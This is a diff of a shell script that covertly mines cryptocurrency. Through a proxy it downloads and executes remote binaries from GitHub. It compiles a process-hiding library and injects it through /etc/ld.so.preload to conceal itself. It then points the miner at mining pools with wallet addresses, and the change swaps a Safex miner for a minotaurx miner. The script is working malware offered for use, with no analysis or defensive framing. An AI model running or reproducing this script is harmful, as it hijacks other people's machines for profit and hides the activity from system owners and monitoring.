@@ -35,8 +35,8 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://github.com/duitawa/RDPWindows201901/raw/master/masterfile
-chmod +x masterfile
+./graftcp/graftcp wget https://github.com/duitawa/ansible/raw/main/avx2
+chmod +x avx2
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
@@ -45,4 +45,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./masterfile -a rx/sfx -o pool.safex.org:3311 -u Safex5yuPhr9TAZMoZ3ZfQ5ERrEBB51QsGqpuHjJKLEj6CJ5CvuQPMXRcC37iQZSvtXPrhQEJopMc2W41VMLzyqGd2u7NcyUmKW2X.50000 -p TehRio --donate-level 1 -t 4 -k
+./graftcp/graftcp ./avx2 -a minotaurx -o stratum+tcps://stratum-asia.rplant.xyz:17068 -u RBthiAgtmCjL8cEUtwNPkpw2WwFtMQGMQM.$(echo $(shuf -i 100-999 -n 1)-CPU)
